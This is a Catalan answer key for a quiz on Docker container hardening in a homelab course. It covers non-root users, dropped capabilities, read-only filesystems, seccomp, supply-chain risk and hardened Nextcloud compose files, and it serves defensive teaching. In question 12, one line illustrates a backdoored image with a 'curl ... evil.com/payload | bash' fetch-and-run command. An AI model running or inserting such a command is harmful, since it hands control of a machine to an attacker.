# Respostes - Capitol 6: Seguretat de contenidors

> Mira les respostes DESPRES d'haver fet el qüestionari.

## Pregunta 1: Risc de root?

**Resposta correcta**: Que si algú l'explota, tindra acces de root a l'amfitrio.

**Explicacio**: Un contenidor root **pot** fer molt mes del que sembla. Tot i que esta aillat, te acces a coses com muntar sistemes de fitxers, carregar moduls del kernel, accedir a dispositius. Si un atacant troba una vulnerabilitat, pot escapar del contenidor i atacar l'amfitrio. Per defecte, els contenidors son root.

---

## Pregunta 2: Usuari no-root?

**Resposta correcta**: `--user 1000:1000`.

**Explicacio**: La flag `--user` (o `-u`) estableix l'UID:GID dins el contenidor. L'exemple posa 1000:1000 perque es l'usuari per defecte de les distribucions modernes. Per a servidors web, sovint es 33:33 (www-data) o 999:999.

---

## Pregunta 3: Que es rootless?

**Resposta correcta**: Docker que s'executa sense root a l'amfitrio.

**Explicacio**: Rootless Docker usa "user namespaces" del kernel Linux per mapejar l'UID 0 del contenidor a un UID no privilegiat a l'amfitrio. Aixi, encara que el contenidor es cregui que es root, al sistema amfitrio es un usuari normal. Es la opcio mes segura pero mes complexe de configurar.

---

## Pregunta 4: Treure capabilities?

**Resposta correcta**: `--cap-drop=ALL`.

**Explicacio**: Les capabilities son permisos especials que tradicionalment nomes te root (muntar, carregar moduls, etc.). Docker ja en treu moltes per defecte pero si vols el maxim de seguretat pots fer `--cap-drop=ALL` i despres afegir nomes les que necessites amb `--cap-add=...`.

---

## Pregunta 5: Read-only?

**Resposta correcta**: Un sistema de fitxers montat nomes de lectura.

**Explicacio**: Si un atacant aconsegueix executar codi dins el contenidor, no podra modificar res (nomes afegir a volums o tmpfs). Es una bona defensa en profunditat.

---

## Pregunta 6: Que es `docker scan`?

**Resposta correcta**: Analitzar vulnerabilitats conegudes a les imatges Docker.

**Explicacio**: `docker scan` consulta una base de dades de CVEs (vulnerabilitats conegudes) i compara amb les llibreries de la teva imatge. Es una bona practica escanejar les imatges regularment.

---

## Pregunta 7: Per que --read-only?

**Resposta correcta**: Perque el sistema de fitxers del contenidor no es pugui modificar.

**Explicacio**: Amb `--read-only`, qualsevol intent d'escriure al filesystem del contenidor falla. El contenidor nomes pot escriure a volums muntats, tmpfs o la xarxa. Es una bona defensa davant atacs que intentin persistir (afegir un binari malicios, modificar una llibreria, etc.).

---

## Pregunta 8: Que es seccomp?

**Resposta correcta**: Restringir les syscalls que un proces pot fer al kernel.

**Explicacio**: Seccomp (secure computing mode) es un mecanisme del kernel Linux que permet filtrar les syscalls. Docker ja l'aplica per defecte amb un perfil que nomes permet les syscalls segures. Es una capa important de defensa.

---

## Pregunta 9 (oberta): Tres vectors d'atac

**Resposta model**:

Els tres vectors d'atac mes comuns contra un contenidor Docker mal configurat son:

**1. Execucio com a root + capabilities excessives**

Un contenidor que s'executa com a root (`docker run` sense `--user`) i conserva capabilities per defecte es una porta oberta. Per exemple, un Nextcloud amb `/var/www/html` montat com a bind mount a `/home/pi/photos/`: si l'atacant aconsegueix explotar una vulnerabilitat de Nextcloud, pot executar codi com a root **dins el contenidor**. Pero el pitjor es que pot muntar sistemes de fitxers de l'amfitrio, carregar moduls del kernel, accedir a dispositius. Amb capabilities com `SYS_ADMIN`, fins i tot pot intentar escapar del contenidor.

Exemple practic: al 2019 es va descobrir una vulnerabilitat a runc (l'eina que Docker usa per executar contenidors) que permetia escapar. Si el contenidor era root amb capabilities, l'atac era factible. Si era no-root, no.

**2. Xarxa exposada i secrets al descobert**

Un altre vector es exposar ports innecesaris o secrets al fitxer compose. Si el Postgres te el port 5432 exposat amb `-p 5432:5432` i el password esta al `docker-compose.yml` en text pla, qualsevol que pugui accedir a la xarxa pot intentar conectar-se. Un atac de "brute force" o un escaneig de ports pot descobrir credencials febles.

Exemple: al BernatLab abans exposava el port de Adminer (8080) a tota la xarxa local. Un veins podia intentar entrar. Ara nomes esta exposat a localhost, i accedeixo per Tailscale.

**3. Imatges vulnerables i desactualitzades**

Si fas `docker run some-random-image` que no s'actualitza des de fa 2 anys, esta ple de vulnerabilitats conegudes. Un escaneig de Trivy sobre una imatge vella pot trobar 50-100 vulnerabilitats critiques. Si el servei te una superficie d'atac (esta exposat a Internet), un atacant pot explotar una d'aquestes.

Exemple: la imatge `nextcloud:20` (de 2021) te 30+ vulnerabilitats conegudes. La `nextcloud:28` (actual) te nomes 2-3. La diferencia es brutal.

Aixo es la **defensa en profunditat**: ni una sola d'aquestes mesures es suficient per si sola. Cal combinar-les totes.

---

## Pregunta 10 (oberta): Seguretat del Nextcloud al BernatLab

**Resposta model**:

Per a un Nextcloud al BernatLab que serveix fitxers personals, aplicaria minim aquestes 6 mesures:

**1. Usuari no-root**

Afegiria al compose: `user: "33:33"` (www-data). D'aquesta manera, encara que un atacant exploti una vulnerabilitat de Nextcloud, no tindra root dins el contenidor. Es la mesura mes basica i la que mes impacte te.

**2. Read-only filesystem**

`read_only: true` al compose. El sistema de fitxers del contenidor es nomes de lectura; nomes pot escriure a volums muntats i tmpfs. Si un atacant intenta persistir (afegir un script, modificar una llibreria), no pot.

Afegeixo `tmpfs` per a carpetes que necessiten escriptura temporal:
```yaml
tmpfs:
  - /tmp:size=100M,noexec,nosuid
```

**3. Capacitats minimes**

`cap_drop: [ALL]` per defecte. Despres afegiria nomes les estrictament necessaries:
```yaml
cap_drop: [ALL]
cap_add: [CHOWN, SETUID, SETGID]  # el minim per a Nextcloud
```

Alternativament, `--security-opt=no-new-privileges` que evita que el procés adquireixi nous privilegis.

**4. Xarxa aillada**

Dues xarxes:
- `xarxa-frontend`: nomes el Nextcloud, accessible des de l'amfitrio.
- `xarxa-backend`: nomes la base de dades.

La base de dades (MariaDB) nomes esta a `xarxa-backend` i mai es exposada a fora. Nextcloud esta a les dues xarxes pero nomes exposa el port 80/443 a l'amfitrio.

**5. Imatge oficial actualitzada**

Usar nomes `nextcloud:stable` o una versio especifica actualitzada regularment. Configurar Watchtower (cap 7) per actualitzar automaticament les imatges quan hi ha noves versions. Escanejar periodicament amb `trivy image nextcloud:stable` per veure vulnerabilitats noves.

**6. Sense privilegis i amb limits**

```yaml
security_opt:
  - no-new-privileges:true
  - seccomp:default  # perfil per defecte (ja esta, pero explicit)
privileged: false  # MAI activar-ho
mem_limit: 1g
cpus: 2
```

Aixo posa limits de memoria i CPU (evita DoS) i desactiva el mode privilegiat (que es una porta oberta).

**Extra: backup xifrat**

Tot i que no es "del contenidor", el backup de les dades del Nextcloud (volum) ha d'estar xifrat. Si el disc falla i el backup es accessible, volem que estigui xifrat. Això es la defensa **despres** que tot falla.

**Resum del compose**:
```yaml
services:
  nextcloud:
    image: nextcloud:stable
    user: "33:33"
    read_only: true
    cap_drop: [ALL]
    cap_add: [CHOWN, SETUID, SETGID]
    security_opt:
      - no-new-privileges:true
    tmpfs:
      - /tmp:size=100M,noexec,nosuid
    mem_limit: 1g
    privileged: false
    networks:
      - frontend
      - backend
    volumes:
      - nc-data:/var/www/html
```

Aixo es la base. En entorns mes critics afegiries SELinux/AppArmor, signatura d'imatges, registre certificat, etc. Pero per a un homelab personal, aquestes 6 mesures ja son un salt qualitatiu enorme.

---

## Pregunta 11 (oberta): Per que Docker ja treu capabilities

**Resposta model**:

Docker, per defecte, ja treu un munt de capabilities de Linux als contenidors. Això es una decisio de disseny critica: en lloc de donar totes les capabilities per defecte i esperar que l'usuari en tregui, Docker nomes dona les estrictament necessaries.

Les capabilities mes perilloses que Docker ja treu per defecte son:

- **CAP_SYS_ADMIN**: una mena de "superusuari" que permet muntar sistemes de fitxers, accedir a /proc d'altres processos, etc. Es la mes perillosa: amb aquesta, un atacant pot escapar del contenidor.
- **CAP_NET_RAW**: permet crear paquets de xarxa raw (com els que fa ping o tcpdump). Un atacant pot fer ARP spoofing o sniffar trafic.
- **CAP_SYS_PTRACE**: permet fer debug d'altres processos. Un atacant pot injectar codi a processos del mateix contenidor o, amb un kernel vulnerable, de l'amfitrio.
- **CAP_DAC_OVERRIDE**: permet saltar-se els permisos dels fitxers. Combinat amb un bind mount, pot accedir a qualsevol fitxer de l'amfitrio.
- **CAP_NET_ADMIN**: permet reconfigurar la xarxa. Pot canviar rutes, obrir ports, fer atacs MITM.

**Important**: "root dins el contenidor" NO es equivalent a "root de l'amfitrio". Gracies al drop de capabilities, encara que un atacant aconsegueixi root dins el contenidor, esta molt limitat. Es com tenir una clau mestra dins una habitacio tancada amb pany: tens acces a tot el que hi ha dins, pero no pots sortir.

**Bona practica**: nomes tornar a afegir les capabilities que REALMENT necessites. Per exemple, si una app necesita fer ping, afegeixes `cap_add: [NET_RAW]`. Pero mira si es pot fer d'una altra manera (usar `nslookup` en lloc de `ping`).

---

## Pregunta 12 (oberta): Seguretat i supply chain al BernatLab

**Resposta model**:

La cadena de subministrament (supply chain) esdevé un risc al BernatLab quan descarregues imatges random de Docker Hub. Considerem el cas:

**Risc d'una imatge random**:
1. Un desconegut puja una imatge `cool-app:latest` a Docker Hub.
2. La imatge conté un script d'inicialitzacio que executa `curl http://evil.com/payload | bash`.
3. Tu la fas servir al teu Nextcloud per alguna funcionalitat addicional.
4. L'atacant ja te acces al teu servidor.

**Cas real**: el 2020, varios miners de cryptomonedes es van colar a imatges populars de Docker Hub. Els usuaris que feien `docker pull` rebien versions backdoorjades sense saber-ho.

**Aplica al cas concret del BernatLab**:
- Si descarregues una imatge "oficial" (Docker Official Image, marcada amb el badge blau), el risc es molt baix. Docker audita aquestes imatges.
- Si descarregues una imatge de la comunitat amb poques descarreigues, el risc es alt. L'autor pot ser maliciosos o incompetent.
- Si construeixes la teva propia imatge desde zero amb un Dockerfile que entens, el risc es minim. Pero la imatge base (debian, alpine) tambe pot tenir vulnerabilitats.

**Politica practica al BernatLab**:
1. Usar nomes imatges "oficials" o de proveidors reconeguts (Bitnami, LinuxServer.io, etc).
2. Construir les teves imatges a partir de les oficials, afegint nomes el que necessites.
3. Escanejar periòdicament amb Trivy o Docker Scout.
4. Fixar la versio: mai `latest` automatic en produccio.
5. Mantenir un registre privat per a les imatges que construeixes.

**Aixo es com la seguretat alimentaria**: no compres carn a qualsevol, sinó a una botiga de confiança. I encara aixi, la cuines tu per asegurar-te.

---

## Pregunta 13 (oberta): Actualitzar o no actualitzar

**Resposta model**:

El company que diu "el Nextcloud porta 2 anys sense actualitzar i funciona perfectament" esta posant en risc tot el sistema. Arguments:

**1. La finestra de vulnerabilitat es gran**:
Cada setmana es publiquen nous CVEs a Nextcloud, PHP, llibreries. Un Nextcloud de 2 anys te centenars de vulnerabilitats acumulades. Nomes cal que UNA d'elles sigui explotable per comprometre el sistema.

**2. Els exploits son cada vegada mes automatitzats**:
Hi ha scanners automatic (Shodan, Censys) que busquen versions especifiques de Nextcloud amb CVEs coneguts. Quan es publica un exploit public (cosa que pasa setmanalment), els atacants l'escanejen en hores. Un Nextcloud de 2 anys sense pegat es un objectiu facil.

**3. Un cop compromes, tot es perd**:
Si un atacant entra, pot:
- Llegir tots els fitxers dels usuaris.
- Esborrar fitxers.
- Instal·lar ransomware (xifrar i demanar rescat).
- Usar el servidor com a punt de partida per atacar altres.
- Fer el servidor part d'una botnet.

**4. Watchtower automatitza el proces**:
El M2 cap 7 introdueix Watchtower, que pot actualitzar automaticament les imatges. Es la solucio al "no tinc temps d'actualitzar". Configurat correctament (amb notificacions i finestres de manteniment), pots tenir un sistema sempre actualitzat sense dedicacio setmanal.

**5. El cost de no actualitzar es asimètric**:
- Actualitzar: 30 min/mes (Watchtower ho fa automatic).
- No actualitzar i tenir un incident: dies de feina, possible perdua de dades, posibles responsabilitats legals (si hi ha dades de tercers).

**Conclusio al company**: "funciona perfectament" es sinònim de "ningú ha intentat trencar-lo encara". No es qüestio de si passarà, sino quan.

---

## Pregunta 14 (oberta): Nextcloud segur al BernatLab

**Resposta model**:

Per a un Nextcloud exposat a internet al BernatLab, el tros de `docker-compose.yml` amb mesures de seguretat seria:

```yaml
services:
  nextcloud:
    image: nextcloud:28-apache  # tag fixe, mai latest
    # 1. Usuari no-root
    user: "33:33"  # www-data dins el contenidor
    # 2. Read-only filesystem amb tmpfs per a directoris d'escriptura
    read_only: true
    tmpfs:
      - /tmp:size=100M
      - /var/www/html/tmp:size=500M
    # 3. Drop totes les capabilities
    cap_drop:
      - ALL
    cap_add:
      - CHOWN  # nomes el que Nextcloud necessita
      - SETUID
      - SETGID
    # 4. No nous privilegis
    security_opt:
      - no-new-privileges:true
    # 5. Xarxa aillada
    networks:
      - frontend  # nomes per rebre trafic HTTPS
    # 6. Limits de recursos
    mem_limit: 1g
    cpus: 1.0
    # 7. Restart automatic nomes en cas de error (no always)
    restart: on-failure:5
    volumes:
      - nc-data:/var/www/html
      - nc-config:/var/www/html/config
    # 8. Sense port directe (passa pel reverse proxy)
    # expose:
    #   - 80

networks:
  frontend:
    external: true  # gestionada per Caddy
```

**Justificacio de cada mesura**:

- **user: "33:33"**: si un atacant aconsegueix executar codi, no sera root.
- **read_only + tmpfs**: el filesystem es immutable. Un atacant no pot persistir modificant fitxers de l'aplicacio.
- **cap_drop: ALL**: nomes les capabilities essencials (CHOWN, SETUID, SETGID) son presents.
- **no-new-privileges**: evita que un binari SUID dins el contenidor es pugui fer root.
- **networks external**: la xarxa la gestiona Caddy (el reverse proxy), no Docker directament.
- **mem_limit**: limita l'impacte d'un atac DoS per memoria.
- **restart: on-failure**: nomes reinicia si hi ha un error real, no per buit legal.

Aixo es un exemple d'un Nextcloud "hardened". No es la maxima seguretat posible, pero es un bon equilibri per a un homelab.

---

## Pregunta 15 (oberta): Seguretat vs funcionalitat

**Resposta model**:

Aplicar mesures de seguretat molt agressives te un cost: pots acabar amb un contenidor que no arranca o que no fa el que ha de fer. Cal trobar l'equilibri.

**Exemples de mesures que poden trencar funcionalitat**:

- `read_only: true` sense tmpfs: qualsevol operacio que necessiti escriure a /tmp falla.
- `cap_drop: ALL` sense afegir les necessaries: ni tan sols el startup basic pot funcionar.
- `mem_limit: 100m` massa baix: el contenidor es queda penjat en OOM.
- `user: nobody`: alguns procesos necessiten un usuari especific (www-data, postgres, etc).
- `--network none` en un servei que necessita parlar amb altres: arranca pero no funciona.

**Equilibri al BernatLab**:

**Serveis exposats a internet** (Nextcloud, Immich, una API publica):
- Seguretat maxima raonable: read-only, cap_drop ALL + necessaries, no-new-privileges, mem_limit, xarxa aillada amb proxy invers.
- Validacio: fer proves de fum (pujar un fitxer a Nextcloud, pujar una foto a Immich) despres d'aplicar les mesures.

**Serveis en xarxa interna** (PostgreSQL, InfluxDB, ChromaDB):
- Seguretat mitjana: cap_drop ALL + les essencials, xarxa backend, no exposar ports.
- Es poden permetre mes permisos perque nomes son accessibles des de dins.

**Eines de desenvolupament** (Adminer, debugging, Jupyter):
- Seguretat minima: nomes xarxa aillada, sense exposar.
- Per definicio son eines de dev, no cal que estiguin blindades.

**Regla d'or**: cada mesura de seguretat que aplicis, documenta per que i prova que el servei segueix funcionant. Si no pots provar, no l'apliquis encara. La seguretat sense funcionalitat es nomes un trasto que ocupa memoria.

**Cicle iteratiu**: comença amb el minim viable segur, valida que funciona, afegeix una mesura, valida, afegeix una altra. No intentis aplicar 20 mesures d'una sola vegada.

---

## Que fer si has fallat moltes preguntes

- **5-8 encerts**: Rellegir el resum i tornar a fer l'exercici.
- **3-4 encerts**: Audita la teva configuracio actual amb Docker Bench Security.
- **0-2 encerts**: Repassem junts. La seguretat es fonamental.

## Que fer si has encertat totes

- Passa al **Capitol 7** (actualitzacio de contenidors).
- Configura rootless Docker a la RPi.
- Executa Docker Bench Security i arregla els warnings.
